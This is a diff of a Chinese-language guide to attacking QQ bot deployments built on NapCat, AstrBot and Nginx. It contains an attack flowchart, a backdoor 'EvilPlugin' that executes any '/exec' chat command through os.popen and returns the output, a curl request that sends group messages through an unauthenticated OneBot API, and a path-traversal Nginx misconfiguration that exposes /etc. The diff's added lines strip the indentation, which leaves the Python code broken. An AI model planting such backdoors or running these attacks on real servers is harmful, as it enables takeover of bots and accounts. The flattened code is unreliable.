@@ -5,19 +5,19 @@
 
 ```mermaid
 flowchart TD
-    Target["QQ Bot 服务器<br>目标"] --> Recon[信息收集]
-    Recon --> E1[子域名枚举]
-    Recon --> E2[端口扫描]
-    Recon --> E3[Web 指纹识别]
-    Recon --> E4[搜索引擎 Dorking]
+ Target["QQ Bot 服务器<br>目标"] --> Recon[信息收集]
+ Recon --> E1[子域名枚举]
+ Recon --> E2[端口扫描]
+ Recon --> E3[Web 指纹识别]
+ Recon --> E4[搜索引擎 Dorking]
 
-    E1 --> A1[NapCat WebUI<br>6099]
-    E1 --> A2[AstrBot WebUI<br>6185]
-    E1 --> A3[Nginx 反向代理<br>443]
+ E1 --> A1[NapCat WebUI<br>6099]
+ E1 --> A2[AstrBot WebUI<br>6185]
+ E1 --> A3[Nginx 反向代理<br>443]
 
-    A2 --> V1[AstrBot 攻击<br>弱口令 / 默认密码<br>API 密钥泄露<br>插件 RCE]
-    A1 --> V2[NapCat 攻击<br>WebUI 弱 Token<br>QQ 号接管]
-    A3 --> V3[Nginx 攻击<br>配置泄露<br>未授权端点<br>路径遍历]
+ A2 --> V1[AstrBot 攻击<br>弱口令 / 默认密码<br>API 密钥泄露<br>插件 RCE]
+ A1 --> V2[NapCat 攻击<br>WebUI 弱 Token<br>QQ 号接管]
+ A3 --> V3[Nginx 攻击<br>配置泄露<br>未授权端点<br>路径遍历]
 ```
 
 
@@ -59,12 +59,12 @@ import os
 from astrbot.api.plugin import Plugin
 
 class EvilPlugin(Plugin):
-    def on_message(self, message):
-        # 收到特定命令时执行系统命令
-        if message.text.startswith('/exec '):
-            cmd = message.text[6:]
-            result = os.popen(cmd).read()
-            self.send_message(result)
+ def on_message(self, message):
+ # 收到特定命令时执行系统命令
+ if message.text.startswith('/exec '):
+ cmd = message.text[6:]
+ result = os.popen(cmd).read()
+ self.send_message(result)
 ```
 
 #### 攻击向量 4：配置读取
@@ -110,8 +110,8 @@ NapCat 的 OneBot API（端口 3000/3001）如果暴露在公网且无 Token 保
 ```bash
 # 示例：通过未授权的 OneBot API 发送消息
 curl -X POST http://目标IP:3000/send_msg \
-  -H "Content-Type: application/json" \
-  -d '{"message_type":"group","group_id":12345,"message":"这是攻击者发送的消息"}'
+ -H "Content-Type: application/json" \
+ -d '{"message_type":"group","group_id":12345,"message":"这是攻击者发送的消息"}'
 ```
 
 #### 攻击向量 4：二维码劫持
@@ -142,7 +142,7 @@ curl https://目标域名/server-status
 ```nginx
 # 错误配置示例
 location /static/ {
-    alias /var/www/;
+ alias /var/www/;
 }
 # 访问 /static/../etc/ 可读取 /etc/ 目录
 ```
